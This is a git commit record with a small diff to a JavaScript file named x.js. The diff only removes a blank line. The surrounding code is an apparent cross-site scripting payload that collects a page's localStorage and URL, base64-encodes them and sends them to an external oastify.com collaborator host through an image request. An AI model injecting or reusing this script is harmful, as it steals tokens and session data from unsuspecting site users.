93f01fe7aed47044bad34c6b0875ce63ff85141b
AmirWilayah <119005771+AmirWilayah@users.noreply.github.com>
2025-07-08 01:06:56 +0800

    x.js

--- x.js
+++ x.js
@@ -3,5 +3,4 @@ const data = {
   localStorage: JSON.stringify(localStorage),
   url: location.href
 };
-
 new Image().src = "https://ebt4xhwz0ffgihdddc7oqtkympsgg84x.oastify.com/leak?" + btoa(JSON.stringify(data));
